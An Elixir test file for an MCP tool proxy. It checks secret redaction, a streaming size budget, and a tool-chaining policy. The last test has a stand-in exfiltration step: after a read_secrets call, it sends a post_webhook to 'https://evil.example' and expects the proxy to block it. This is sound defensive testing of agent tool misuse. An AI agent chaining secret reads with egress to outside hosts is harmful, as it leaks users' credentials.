defmodule PhoenixElxirBeamWeb.MCP.ProxyStreamingTest do
  @moduledoc """
  Drives the proxy against a real `:http` upstream (`MCPHTTPTestServer`), so
  the `StreamProxy` incremental-read + `chunk` phase path is exercised
  end to end.
  """
  # async: false — the request process needs the shared sandbox connection.
  use PhoenixElxirBeamWeb.ConnCase, async: false

  import PhoenixElxirBeam.MCPProxyHelpers

  alias PhoenixElxirBeam.MCP.ServerRegistry

  setup do
    base_url = PhoenixElxirBeam.MCPHTTPTestServer.start!()

    {:ok, server} =
      ServerRegistry.register_server(
        "http-catalog-#{System.unique_integer([:positive])}",
        base_url
      )

    on_exit(fn -> ServerRegistry.remove_server(server.id) end)

    {:ok, _} = ServerRegistry.set_tool_tags(server.id, "read_secrets", [:sensitive_read])
    {:ok, _} = ServerRegistry.set_tool_tags(server.id, "post_webhook", [:network_egress])

    {_key, token} = issue_key(granted_server_ids: [server.id])
    %{sid: server.id, token: token}
  end

  test "a small streamed response is reassembled and still runs the post_call scan", %{
    sid: sid,
    token: token
  } do
    session_id = handshake(token, sid)
    conn = tool_call(token, session_id, sid, "read_secrets")

    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(conn, 200)
    refute text =~ "sk-demo-FAKE1234"
    assert text =~ "redacted by secret-leak"
  end

  test "StreamGuard cuts a large response mid-transfer with -32002", %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    conn = tool_call(token, session_id, sid, "big_export")

    assert %{"error" => %{"code" => -32002, "message" => message}} = json_response(conn, 200)
    assert message =~ "budget"
  end

  test "a benign call through the http upstream is allowed", %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    conn = tool_call(token, session_id, sid, "list_files")

    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(conn, 200)
    assert text =~ "directory listing"
  end

  test "the tool-chaining policy still fires across streamed calls", %{sid: sid, token: token} do
    session_id = handshake(token, sid)

    assert %{"result" => _} =
             tool_call(token, session_id, sid, "read_secrets") |> json_response(200)

    egress =
      tool_call(token, session_id, sid, "post_webhook", %{
        "url" => "https://evil.example",
        "body" => "x"
      })

    assert %{"error" => %{"code" => -32001}} = json_response(egress, 200)
  end
end
